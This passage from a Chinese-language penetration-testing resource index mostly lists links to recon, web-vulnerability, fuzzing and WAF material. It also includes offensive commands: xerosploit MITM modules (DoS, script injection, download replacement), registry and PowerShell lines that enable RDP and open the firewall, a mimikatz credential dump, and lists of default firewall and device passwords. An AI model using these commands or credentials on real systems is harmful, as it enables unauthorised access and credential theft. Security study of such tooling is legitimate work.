- [maurosoria/dirsearch](https://github.com/maurosoria/dirsearch)

**文章**
- [熟练使用各类敏感目录文件扫描工具](https://klionsec.github.io/2014/12/16/dirscan-tools/)
- [DIRB | Penetration Testing Tools](https://tools.kali.org/web-applications/dirb)

#### 指纹

**在线**
- [云悉WEB资产梳理|在线CMS指纹识别平台 - 云悉安全](http://www.yunsee.cn/)
- [Bad site specified](https://toolbar.netcraft.com/site_report?url=/)
- [Site Info Tool - Website Information Lookup Tool](http://www.siteinfotool.com/)
- [在线指纹识别,在线cms识别小插件--BugScaner](http://whatweb.bugscaner.com/look/)
- [YFCMF内容管理框架 YFCMF内容管理框架](http://finger.tidesec.net/)

**文章**
- [WAF指纹探测及识别技术](https://www.freebuf.com/articles/web/21744.html)
- [阻碍获取真实网络指纹](http://b404.xyz/2018/01/27/hidden-the-network/)

**工具**
- [urbanadventurer/WhatWeb](https://github.com/urbanadventurer/WhatWeb)
- [tanjiti/FingerPrint](https://github.com/tanjiti/FingerPrint)
- [webanalyzer/rules](https://github.com/webanalyzer/rules) - 通用的指纹识别规则

#### 旁站

**在线**
- https://dns.aizhan.com/
- http://www.sameip.org/
- https://www.robtex.com/
- http://www.webscan.cc/
- http://www.114best.com/ip/
- http://www.5kik.com/c/
- https://phpinfo.me/bing.php
- https://dnsdumpster.com/

#### whois/备案

**whois 查询**
- http://wq.apnic.net/apnic-bin/whois.pl
- https://centralops.net/co/
- https://www.register.com/whois.rcmx
- https://www1.domain.com/whois/whois.bml
- https://whois.net/
- https://whois.domaintools.com/
- https://who.is/
- https://www.t00ls.net/domain.html
- https://www.whois.com.au/whois/abn.html
- http://whois.webmasterhome.cn/
- https://whois.aliyun.com/
- https://who.is/whois/xxx.com
- https://whois.icann.org/zh/lookup
- http://whoissoft.com/
- http://whois.chinaz.com/
- https://www.whois.com/
- http://whois.domaintools.com/
- https://whois.icann.org/en

**whois 工具**
- http://www.freebuf.com/articles/network/107372.html

**备案查询**
- http://www.beianbeian.com/
- http://beian.gov.cn/portal/recordQuery
- http://www.miitbeian.gov.cn/publish/query/indexFirst.action

### 另类
**截图**
- [FortyNorthSecurity/EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness) - 获取网站的屏幕截图，提供一些服务器标头信息，并在可能的情况下识别默认凭据。(要下的依赖挺多的，比较费功夫)
- [michenriksen/aquatone](https://github.com/michenriksen/aquatone)
- [Nmap-Tools/NSE/http-screenshot.nse](https://github.com/SpiderLabs/Nmap-Tools/blob/master/NSE/http-screenshot.nse) - 可以截图的 Nmap 脚本

---

## LAN
### 中间人

**工具**
- [LionSec/xerosploit](https://github.com/LionSec/xerosploit)
    - **文章**
        - [xerosploit用法](http://www.cnbreak.org/anquan/461.html)

    - **安装**
        ```bash
        git clone https://github.com/LionSec/xerosploit
        cd xerosploit && sudo python install.py
        1
        ./xerosploit
        ```

    - **基本操作**
        ```bash
        scan # 映射你的网络
        iface # 手动设置网络接口
        gateway # 手动设置网关
        rmlog # 删除所有日志
        ```

    - **模块演示(部分)**
        ```bash
        start
        <靶机IP>
        pscan # 端口扫描
        run

        dos # dos攻击
        run

        injecthtml # 将 html 注入到目标访问的网站中
        run
        /root/test.html

        injectjs # 将 javascript 注入到目标网站中
        run
        /root/test.js

        rdownload # 替换目标下载的文件
        run
        exe
        /root/test.exe

        sniff # 嗅探目标的流量
        run
        ```

- [bettercap/bettercap](https://github.com/bettercap/bettercap)
- [byt3bl33d3r/MITMf](https://github.com/byt3bl33d3r/MITMf)
- [cain](http://www.oxid.it/cain.html)

---

## WAN
### DDOS
略

---

## windows 渗透
### Exchange

- [APT34 Exchange 爆破工具](https://github.com/blackorbird/APT_REPORT/blob/master/APT34/Jason.zip)

### RDP

**cmd 开 RDP**
- 文章
    - [开启 RDP](http://b404.xyz/2017/12/27/open-RDP/)

- 命令
    - **dos 命令开启 3389 端口(开启 XP&2003 终端服务)**
        1. 方法一：`REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f`

        2. 方法二：`REG add HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /d 0 /t REG_DWORD /f`

    - **WMIC 开启 3389**

         `wmic /namespace:\\root\CIMV2\TerminalServices PATH Win32_TerminalServiceSetting WHERE (__CLASS !="") CALL SetAllowTSConnections 1`

    - **PowerShell 开启 RDP**
        1. Enable RDP
        `set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0`

        2. Allow RDP in firewall
        `Set-NetFirewallRule -Name RemoteDesktop-UserMode-In-TCP -Enabled true`

        3. Enable secure RDP authentication
        `set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1`

        或

        1. Enable Remote Desktop
        `(Get-WmiObject Win32_TerminalServiceSetting -Namespace root\cimv2\TerminalServices).SetAllowTsConnections(1,1) `
        `(Get-WmiObject -Class "Win32_TSGeneralSetting" -Namespace root\cimv2\TerminalServices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) `

        2. Enable the firewall rule
        `Enable-NetFirewallRule -DisplayGroup "Remote Desktop"`

    - **查看 3389 端口是否开启**

        `REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /*如果是0x0则开启`

    - **更改终端端口为 2008(十六进制为：0x7d8)**

        1. `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x7d8 /f`
        2. `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 0x7D8 /f`

    - **查看 3389 端口是否更改**

        `REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber  /*出来的结果是 16 进制`

    - **取消 xp&2003 系统防火墙对终端服务的限制及 IP 连接的限制：**

        `REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled :@ xpsp2res.dll,-22009 /f`

**第三方连接工具**
- [rdesktop/rdesktop](https://github.com/rdesktop/rdesktop)
- [Remmina](https://remmina.org/)
- [FreeRDP/FreeRDP](https://github.com/FreeRDP/FreeRDP)

**多开**
- 文章
    - [Win7双开3389](https://blog.csdn.net/SysProgram/article/details/11810889)
    - [渗透技巧——Windows系统远程桌面的多用户登录](http://www.4hou.com/system/8314.html)
    - [Multi-User login in Windows 7/Vista/XP using Remote Desktop](http://zahirkhan.com/tools-utilities/multi-user-login-in-windows-7)

- 工具
    - [stascorp/rdpwrap](https://github.com/stascorp/rdpwrap)

**连接记录**
- 文章
    - [渗透技巧——获得Windows系统的远程桌面连接历史记录](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%BE%97Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/)
    - [关于windows的RDP连接记录](http://rcoil.me/2018/05/%E5%85%B3%E4%BA%8Ewindows%E7%9A%84RDP%E8%BF%9E%E6%8E%A5%E8%AE%B0%E5%BD%95/)
    - [How to Clear RDP Connections History in Windows](http://woshub.com/how-to-clear-rdp-connections-history/#h2_3)

- 工具
    - [3gstudent/List-RDP-Connections-History](https://github.com/3gstudent/List-RDP-Connections-History)

---

### 口令获取及破解

**工具**
- **mimikatz**

    提权
    `privilege::debug`

    抓取密码
    `sekurlsa::logonpasswords`

    或
    ```
    D:\>mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit && dir //打印输出 mimikatz
    D:\>mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> log.txt //输出到 log.txt
    ```

- [skelsec/pypykatz](https://github.com/skelsec/pypykatz) - 用纯 Python 实现的 Mimikatz

- [AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne) - 抓密码神器

- [Arvanaghi/SessionGopher](https://github.com/Arvanaghi/SessionGopher) - 使用 WMI 提取 WinSCP、PuTTY、SuperPuTTY、FileZilla 和 Microsoft remote Desktop 等远程访问工具保存的会话信息的 ps 脚本

- **[Invoke-WCMDump](https://github.com/peewpw/Invoke-WCMDump)**
    ```
    set-executionpolicy remotesigned
    import-module .\Invoke-WCMDump.ps1
    invoke-wcmdump
    ```

- [SterJo Key Finder](https://www.sterjosoft.com/key-finder.html) - 找出系统中软件的序列号

---

### 域渗透

鸽

---

## web 渗透
### 常见漏洞
**文章**
- [聊聊安全测试中如何快速搞定Webshell](https://www.freebuf.com/articles/web/201421.html)

#### 任意文件下载/读取
**案例**
- [电信某分站配置不当导致敏感文件泄露](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-095088)
- [一个任意文件读取漏洞记录](https://toutiao.io/posts/423535/app_preview)
- [南方周末邮件服务器任意文件读取漏洞](http://wooyun.jozxing.cc/static/bugs/wooyun-2013-045426.html)

#### 文件包含漏洞
**案例**
- [IKEA官网本地文件包含(LFI)漏洞分析 - 嘶吼 RoarTalk](http://www.4hou.com/vulnerable/13759.html)

**文章**
- [LFI、RFI、PHP封装协议安全问题学习 - 骑着蜗牛逛世界](https://www.cnblogs.com/LittleHann/p/3665062.html#3831621)
- [php文件包含漏洞 | Chybeta](https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/)
- [文件包含漏洞](https://blog.csdn.net/le0nis/article/details/52043732)
- [文件包含漏洞(绕过姿势) ](https://thief.one/2017/04/10/2/)
- [文件包含漏洞原理分析](https://zhuanlan.zhihu.com/p/25069779)
- [文件包含漏洞总结 | 瓦都剋](http://byd.dropsec.xyz/2016/07/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/)
- [本地文件包含漏洞利用技巧](https://www.secpulse.com/archives/55769.html)
- [Directory Traversal, File Inclusion, and The Proc File System](https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/)
- [Exploiting PHP File Inclusion – Overview | Reiners' Weblog](https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/)
- [Local File Inclusion with Magic_quotes_gpc enabled - NotSoSecure](https://www.notsosecure.com/local-file-inclusion-with-magic_quotes_gpc-enabled/)
- [Positive Technologies - learn and secure : Another alternative for NULL byte](https://blog.ptsecurity.com/2010/08/another-alternative-for-null-byte.html)
- [远程包含和本地包含漏洞的原理 - Kevins的天空 http://rootsec.cn - CSDN博客](https://blog.csdn.net/iiprogram/article/details/2349322)

**笔记**
- [文件包含漏洞笔记](./笔记/文件包含漏洞笔记.md)

#### 文件解析漏洞
**文章**
- [解析漏洞总结 – erevus](http://www.vuln.cn/7070)

**笔记**
- [文件解析漏洞笔记](./笔记/文件解析漏洞笔记.md)

#### 文件上传漏洞
**文章**
- [简单粗暴的文件上传漏洞](https://paper.seebug.org/560/)(https://mp.weixin.qq.com/s/e1jy-DFOSROmSvvzX_Ge5g)

**笔记**
- [文件上传漏洞笔记](./笔记/文件上传漏洞笔记.md)

**靶场**
- [upload-labs](https://github.com/c0ny1/upload-labs)
    - [upload-labs 小记](./实验/upload-labs小记.md)

#### 信息泄露漏洞
**文章**
- [谈谈源码泄露](https://blog.csdn.net/GitChat/article/details/79014538)
- [敏感文件泄露](http://www.myh0st.cn/index.php/archives/62/)

**目录遍历**
- **案例**
    - [京东商城两处任意目录遍历下载漏洞](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0214222)

**GIT 源码泄露**
- **简介**

    当在一个空目录执行 git init 时，Git 会创建一个 .git 目录。 这个目录包含所有的 Git 存储和操作的对象。 如果想备份或复制一个版本库，只需把这个目录拷贝至另一处就可以了。

- **案例**
    - [大众点评某站点git泄漏源代码](http://www.anquan.us/static/bugs/wooyun-2015-0117332.html)

- **工具**
    - [lijiejie/GitHack](https://github.com/lijiejie/GitHack)
    - [gakki429/Git_Extract](https://github.com/gakki429/Git_Extract)

**SVN 源码泄露**

- **案例**
    - [我爱我家某处源码泄露](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0149331)

- **工具**
    - [kost/dvcs-ripper](https://github.com/kost/dvcs-ripper)

**DS_Store 文件泄漏**
- **简介**

    .DS_Store 文件 MAC 系统是用来存储这个文件夹的显示属性的：比如文件图标的摆放位置。如果用户删除以后的副作用就是这些信息的失去。

    这些文件本来是给 Finder 使用的，但它们被设想作为一种更通用的有关显示设置的元数据存储，诸如图标位置和视图设置。 当你需要把代码上传的时候，安全正确的操作应该把 .DS_Store 文件删除才正确。

    因为里面包含了一些目录信息，如果没有删除，攻击者通过 .DS_Store 可以知道这个目录里面所有文件名称，从而让攻击者掌握了更多的信息。　

- **案例**
    - [TCL某网站DS_Store文件泄露敏感信息](http://www.anquan.us/static/bugs/wooyun-2015-091869.html)

- **工具**
    - [lijiejie/ds_store_exp](https://github.com/lijiejie/ds_store_exp)

**网站备份压缩文件**
- **简介**

    该漏洞的成因主要有是管理员将备份文件放在到 web 服务器可以访问的目录下。

    该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。

- **案例**
    - [百度某分站备份文件泄露](http://www.anquan.us/static/bugs/wooyun-2014-050622.html)
    - [乐友商城24GB代码与数据库敏感文件泄露](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0124051)

**WEB-INF/web.xml 信息泄露**
- **简介**

    WEB-INF 是 Java 的 WEB 应用的安全目录。该目录原则上来说是客户端无法访问，只有服务端才可以可以访问。如果想在页面中直接访问其中的文件，必须通过 web.xml 文件对要访问的文件进行相应映射才能访问。

    WEB-INF 主要包含一下文件或目录：
    ```
    /WEB-INF/web.xml：Web 应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则；
    /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非 servlet class，他们不能包含在 .jar 文件中；
    /WEB-INF/lib/：存放 web 应用需要的各种 JAR 文件，放置仅在这个应用中要求使用的 jar 文件 , 如数据库驱动 jar 文件；
    /WEB-INF/src/：源码目录，按照包名结构放置各个 java 文件；
    /WEB-INF/database.properties：数据库配置文件。
    ```
    不过在一些特定的场合却会让攻击者能读取到其中的内容，从而造成源码泄露。

- **案例**
    - [华为官网WEB-INF目录配置文件导致信息泄露](http://www.anquan.us/static/bugs/wooyun-2013-022906.html)

**idea 文件夹泄露**
- **工具**
    - [lijiejie/idea_exploit](https://github.com/lijiejie/idea_exploit)

**phpinfo**
- **文章**
    - [phpinfo可以告诉我们什么](http://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/)
    - [PHPINFO 中的重要信息](https://www.k0rz3n.com/2019/02/12/PHPINFO%20%E4%B8%AD%E7%9A%84%E9%87%8D%E8%A6%81%E4%BF%A1%E6%81%AF/)
    - [amazing phpinfo() ](https://skysec.top/2018/04/04/amazing-phpinfo/)
    - [phpinfo中值得注意的信息](https://seaii-blog.com/index.php/2017/10/25/73.html)

- **工具**
    - [proudwind/phpinfo_scanner](https://github.com/proudwind/phpinfo_scanner) - 抓取 phpinfo 重要信息 - 我这里运行报错，解决方法是把15行的3个 nth-child 改为 nth-of-type

**jsonp 信息泄露**
- **文章**
    - [jsonp原理详解——终于搞清楚jsonp是啥了](https://blog.csdn.net/hansexploration/article/details/80314948)

- **案例**
    - [中国联通某站jsonp接口跨域导致信息泄漏并可开通某些套餐（运营商额外插入功能带来的风险）](https://shuimugan.com/bug/view?bug_no=172305)
    - [京东商城JSONP+CSRF导致某处信息泄露](https://shuimugan.com/bug/view?bug_no=121266)
    - [迅雷某站jsonp劫持漏洞泄漏会话ID，cookie](https://shuimugan.com/bug/view?bug_no=121639)
    - [唯品会某处JSONP+CSRF泄露重要信息](https://shuimugan.com/bug/view?bug_no=122755)
    - [新浪微博之点击我的链接就登录你的微博(JSONP劫持)](https://shuimugan.com/bug/view?bug_no=204941)
    - [苏宁易购多接口问题可泄露用户姓名、地址、订单商品（jsonp案例）](https://shuimugan.com/bug/view?bug_no=118712)
    - [通过jsonp可以获得当前用户的QQ+crsf刷收听](https://shuimugan.com/bug/view?bug_no=70690)
    - [利用JSONP劫持可以泄漏QQ号](https://shuimugan.com/bug/view?bug_no=65177)
    - [京东商城某处jsonp接口可泄露任意用户的搜索记录](https://shuimugan.com/bug/view?bug_no=44210)
    - [新浪微博JSONP劫持之点我链接开始微博蠕虫+刷粉丝](https://shuimugan.com/bug/view?bug_no=171499)
    - [fanwe O2O用户密码可劫持（通用/开源软件jsonp劫持案例）](https://shuimugan.com/bug/view?bug_no=124949)

#### CSRF
**文章**
- [CSRF的攻击与防御](http://www.secbox.cn/hacker/5742.html)

#### http 参数污染
**文章**
- [Web应用里的HTTP参数污染（HPP）漏洞](https://blog.csdn.net/eatmilkboy/article/details/6761407)
- [浅谈绕过waf的数种方法](https://www.waitalone.cn/waf-bypass.html)
- [通过HTTP参数污染绕过WAF拦截](http://www.freebuf.com/articles/web/5908.html)

#### php 反序列化
**工具**
- [php在线反序列化工具](https://www.w3cschool.cn/tools/index?name=unserialize)

#### SSRF
**文章**
- [SSRF漏洞分析及利用](https://www.knowsec.net/archives/85/)
- [浅析SSRF原理及利用方式](https://www.anquanke.com/post/id/145519)
- [SSRF利用与防御](https://hellohxk.com/blog/ssrf/)

#### URL 跳转漏洞
**文章**
- [URL 重定向及跳转漏洞](http://www.pandan.xyz/2016/11/15/url%20%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/)
- [分享几个绕过URL跳转限制的思路](https://www.anquanke.com/post/id/94377)

---

### 进阶玩法
#### HTTP request smuggling
**文章**
- [HTTP Desync Attacks: Request Smuggling Reborn | Blog - PortSwigger](https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn)
- [HTTP Desync Attacks: Smashing into the Cell Next Door ](https://xz.aliyun.com/t/5978) - 上面的翻译版
- [What is HTTP request smuggling? Tutorial & Examples](https://portswigger.net/web-security/request-smuggling)

#### bypass disable_functions

---

### 逻辑类
**文章**
- [密码找回逻辑漏洞总结](http://www.anquan.us/static/drops/web-5048.html)
- [密码找回功能可能存在的问题](http://www.anquan.us/static/drops/papers-287.html)
- [密码找回功能可能存在的问题(补充)](http://www.anquan.us/static/drops/web-3295.html)
- [业务安全漏洞挖掘归纳总结](http://www.anquan.us/static/drops/web-6917.html)
- [应用程序逻辑错误总结](http://www.anquan.us/static/drops/papers-1418.html)
- [在线支付逻辑漏洞总结](http://www.anquan.us/static/drops/papers-345.html)
- [web渗透测试之攻破登录页面](https://zhuanlan.zhihu.com/p/35257242)
- [我的越权之道](http://www.anquan.us/static/drops/tips-727.html)

**资源**
- [web逻辑漏洞挖掘快速入门到放弃](./教程/web逻辑漏洞挖掘快速入门到放弃.docx)

**笔记**
- [逻辑类漏洞笔记](./笔记/逻辑类漏洞笔记.md)

---

### Fuzz
#### 字典
**字典生成**
- [LandGrey/pydictor](https://github.com/LandGrey/pydictor)
- [crunch](https://sourceforge.net/projects/crunch-wordlist/)
- [RicterZ/genpAss](https://github.com/RicterZ/genpAss)

**字典资源**
- [weakpass](https://weakpass.com/)
- [danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
- https://downloads.skullsecurity.org/passwords/
- [rootphantomer/Blasting_dictionary](https://github.com/rootphantomer/Blasting_dictionary)
- [H4lo/dictionary](https://github.com/H4lo/dictionary)
- [TheKingOfDuck/fuzzDicts](https://github.com/TheKingOfDuck/fuzzDicts)
- [Bo0oM/fuzz.txt: Potentially dangerous files](https://github.com/Bo0oM/fuzz.txt)

**默认设备/服务口令**
- 设备

    很多厂商设备可以在这个网站找到 https://default-password.info/
    ```bash
    X 晖
    admin  123456

    X 捷
    ruijie  ruijie

    X 捷 ap
    admin/ruijie  apdebug

    FUJI XEROX 打印机
    11111 x-admin

    RICOH 打印机
    supervisor 密码为空

    X 康威视
    admin  初始密码一般设为 12345 123456  888888  admin

    X 盟 RSAS 安全系统
    reporter，auditor   密码：nsfocus
    ```

- 服务
    ```bash
    zabbix
    admin zabbix
    ```

---

#### web 暴力破解
**工具**
- Burpsuite
- [lijiejie/htpwdScan](https://github.com/lijiejie/htpwdScan)
- [yzddmr6/WebCrack](https://github.com/yzddmr6/WebCrack) - web后台弱口令/万能密码批量爆破、检测工具。支持主流及部分小众 CMS。

---

#### SQL inje
按 SQLMap 中的分类来看，SQL 注入类型有以下 5 种：
```
UNION query SQL injection(可联合查询注入)
Stacked queries SQL injection(可多语句查询注入)
Boolean-based blind SQL injection(布尔型注入)
Error-based SQL injection(报错型注入)
Time-based blind SQL injection(基于时间延迟注入)
```

**靶场**

**教程**
- [SQL 注入 - CTF Wiki](https://ctf-wiki.github.io/ctf-wiki/web/sqli/)
- [Beyond SQLi: Obfuscate and Bypass](https://www.exploit-db.com/papers/17934)
- [aleenzz/MSSQL_SQL_BYPASS_WIKI](https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI)
- [aleenzz/MYSQL_SQL_BYPASS_WIKI](https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI)

**payload**
- [trietptm/SQL-Injection-Payloads](https://github.com/trietptm/SQL-Injection-Payloads)

**笔记**
- [SQLi笔记](./笔记/SQLi笔记.md)

**sqlmap**
- **笔记**
    - [sqlmap 小记](./工具/sqlmap小记.md)

---

#### XSS

**案例**
- [BugBounty：Twitter 蠕虫XSS](https://xz.aliyun.com/t/5050)
- [T00LS帖子正文XSS](https://www.hackersb.cn/hacker/235.html)
- [The adventures of xss vectors in curious places](https://github.com/Dliv3/Venom) - 叹为观止

**xss 平台**
- **开源平台**
    - [firesunCN/BlueLotus_XSSReceiver](https://github.com/firesunCN/BlueLotus_XSSReceiver)

- **在线平台**
    - http://xssye.com/index.php

- **beef**

    - 文章
        - [浏览器攻击框架BeEF Part 1](https://www.freebuf.com/articles/web/175755.html)
        - [浏览器攻击框架BeEF Part 2：初始化控制](https://www.freebuf.com/articles/web/176139.html)
        - [浏览器攻击框架BeEF Part 3：持续控制](https://www.freebuf.com/articles/web/176550.html)
        - [浏览器攻击框架BeEF Part 4：绕过同源策略与浏览器代理](https://www.freebuf.com/articles/web/176873.html)
        - [浏览器攻击框架BeEF Part 5：Web应用及网络攻击测试](https://www.freebuf.com/articles/web/176912.html)

        默认端口为 3000，默认路径是`/ui/authentication`，默认用户名和密码 beef

**xss 检测环境/靶场**
- **本地靶机**

    **简单版**
    ```php
    <?php
    $input=$_GET["parm"];
    echo "<div>".$input."</div>";
    ?>
    ```
    然后访问 xxx.xxx.xxx.xxx/1.php?parm= 加上你的xss代码

    **进阶版**
    - [xss练习源码](./文件/xss练习源码.zip)
    - [XSS通关小游戏以及我的挑战思路分享](https://bbs.ichunqiu.com/thread-15664-1-1.html)

    **在线版**
    - http://demo.testfire.net/
    - https://juice-shop.herokuapp.com/#/search

**笔记**
- [XSS 笔记](./笔记/XSS笔记.md)

**文章**
- [XSS插入绕过一些方式总结](https://blog.csdn.net/qq_29277155/article/details/51320064)
- [XSS总结](https://xz.aliyun.com/t/4067)
- [WAF的XSS绕过姿势](https://www.freebuf.com/articles/web/81959.html)
- [他山之石 | 对 XSS 的一次深入分析认识](https://www.freebuf.com/articles/web/195507.html)
- [minimaxir/big-list-of-naughty-strings](https://github.com/minimaxir/big-list-of-naughty-strings)
- [深入理解浏览器解析机制和XSS向量编码](http://bobao.360.cn/learning/detail/292.html)
- [csp与bypass的探讨(译文)](http://wutongyu.info/csp-2015/)

**工具**
- [s0md3v/XSStrike](https://github.com/s0md3v/XSStrike) - 凑合着用吧，效果一般
    - 依赖
        ```bash
        pip3 install -r requirements.txt

        wget https://github.com/mozilla/geckodriver/releases/download/v0.24.0/geckodriver-v0.24.0-linux64.tar.gz
        mkdir /usr/local/temp
        mv geckodriver /usr/local/temp
        PATH=$PATH:/usr/local/temp/
        ```

    - **[Usage](https://github.com/s0md3v/XSStrike/wiki/Usage#scan-a-single-url)**
        ```bash
        python3 xsstrike.py -u "http://example.com/search.php?q=query"
        python3 xsstrike.py -u "http://example.com/search.php?q=query" --fuzzer
        python3 xsstrike.py -u "http://example.com/search.php?q=query" --crawl
        ```

- [faizann24/XssPy](https://github.com/faizann24/XssPy)

**payload**
- [ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)

**tips**
- **Firefox 关闭 xss 过滤器**

    about:config 把 rowser.urlbar.filter.javascript 改为 false

- **chrome 关闭 xss 过滤器**

    带参数启动 --args --disable-xss-auditor

#### XXE

**文章**
- [浅谈XXE攻击 - FreeBuf互联网安全新媒体平台](https://www.freebuf.com/articles/web/126788.html)

**笔记**
- [XXE 笔记](./笔记/XXE笔记.md)

**靶场**
- [c0ny1/xxe-lab: 一个包含php,java,python,C#等各种语言版本的XXE漏洞Demo](https://github.com/c0ny1/xxe-lab)
- [TheTwitchy/vulnd_xxe](https://github.com/TheTwitchy/vulnd_xxe)

---

### 安防设备
**常见安服默认口令**
```bash
天融信防火墙
8080
用户名:superman 密码:talent、talent!23
test/123456

联想网御防火墙
8889
用户名:admin    密码:leadsec@7766、administrator、bane@7766

深信服防火墙
用户名：admin   密码：admin

启明星辰
8889
用户名：admin   密码：bane@7766、admin@123

juniper
用户名:netscreen    密码:netscreen

Cisco
用户名:admin    密码:cisco

Huawei
用户名:admin    密码:Admin@123
eudemon eudemon

H3C
用户名:admin    密码:admin

绿盟IPS
用户名: weboper 密码: weboper

网神防火墙
用户名：admin   密码：firewall

华为VPN
账号：root  密码：mduadmin

迪普
admin/admin_default

山石
hillstone/hillstone

安恒明御防火墙
admin/adminadmin

齐治堡垒机
shterm/shterm
```

**文章**
- [国内防火墙默认密码](https://www.qugcloud.cn/2018/05/19/firewall-pwd/)
- [IDS逃避技术和对策](https://www.oschina.net/question/12_6140)
- [IDS和IPS的部署细节科普](http://www.freebuf.com/articles/rookie/149445.html)
- [WAF产品的探索](https://zhuanlan.zhihu.com/p/25307262)
- [入侵检测术语全接触](https://zhuanlan.zhihu.com/p/30434636)

#### WAF
**文章**
- [██大学通用型WAF不完全绕过(持续非定期更新) ](https://drivertom.blogspot.com/2018/12/waf.html)
- [技术讨论 | 在HTTP协议层面绕过WAF](https://www.freebuf.com/news/193659.html)
- [利用分块传输吊打所有WAF](https://www.anquanke.com/post/id/169738)
- [编写Burp分块传输插件绕WAF](http://gv7.me/articles/2019/chunked-coding-converter/)
- [输入内容存在危险字符,安全起见,已被本站拦截](https://bbs.ichunqiu.com/thread-44577-1-1.html)
- [Web Application Firewall (WAF) Evasion Techniques – secjuice™ – Medium](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8)
- [浅谈绕过waf的数种方法](https://www.waitalone.cn/waf-bypass.html)
- [绕过云锁文件读取防护](https://drivertom.blogspot.com/2019/06/lfi.html)

**工具**
- [EnableSecurity/wafw00f: WAFW00F allows one to identify and fingerprint Web Application Firewall (WAF) products protecting a website.](https://github.com/EnableSecurity/wafw00f)

**笔记**
- [绕 waf 总结](./笔记/绕waf总结.md)

**国内**
- [阿里云盾（AliYunDun）/安骑士](https://www.alibabacloud.com/zh/product/server-guard)
- [安全宝](http://www.anquanbao.com/)
- [安全狗](http://www.safedog.cn/)
- [百度云加速](https://cloud.baidu.com/product/waf.html)
- [牛盾](https://www.newdefend.com/)
- [瑞数 River Safeplus](https://www.riversecurity.com.cn/pro4.shtml)
- [创宇盾](https://www.365cyd.com/)
- [云盾](https://www.yundun.com/)
- [NSFOCUS](https://nsfocusglobal.com/web-application-firewall-waf/)
- [CdnNS waf](https://www.cdnns.com/)
- [Safeline (Chaitin Tech.)](https://www.chaitin.cn/en/safeline)
- [Tencent Cloud Web Application Firewall](https://intl.cloud.tencent.com/product/waf)
- [玄武盾](https://www.websaas.cn/xwd.php)
- [云锁](https://www.yunsuo.com.cn/)

**国外**
- [aeSecure](https://www.aesecure.com/en/)
- [Airlock WAF](https://www.airlock.com/en/secure-access-hub/components/web-application-firewall-waf)
- [Alert Logic](https://www.alertlogic.com/solutions/web-application-firewall/)
- [Approach](https://www.approach.be)
- [Armor Defense](https://www.armor.com/)
- [Astra Web Protection](https://www.getastra.com/)
- [Barikode WAF](https://www.ethic.ninja/barikode-waf-produk-solusi-keamanan-website)
- [Barracuda Networks](https://www.barracuda.com/products/webapplicationfirewall)
- [Bekchy](https://www.bekchy.com/)
- [BitNinja](https://bitninja.io/)
- [BlockDoS](https://www.blockdos.net/)
- [Bluedon](http://bluedon.com/en/)
- [CacheWall (Varnish)](https://www.varnish-software.com/solutions/varnish-enterprise/varnish-waf/)
- [Citrix](https://www.citrix.com/products/citrix-web-app-firewall/get-started.html)
- [Cloudbric (Penta Security)](https://www.cloudbric.com/)
- [Cloudflare](https://www.cloudflare.com/waf/)
- [Comodo cWatch (Comodo CyberSecurity)](https://www.comodo.com/website-security-platform/cwatch.php)
- [CrawlProtect](http://www.crawltrack.fr/)
- [DenyALL (Rohde & Schwarz CyberSecurity)](https://www.denyall.com/products/web-application-firewall/)
- [Distil (Distil Networks)](https://www.distilnetworks.com/glossary/term/web-application-firewall/)
- [DOSarrest](https://www.dosarrest.com/solutions/web-application-firewall-waf/)
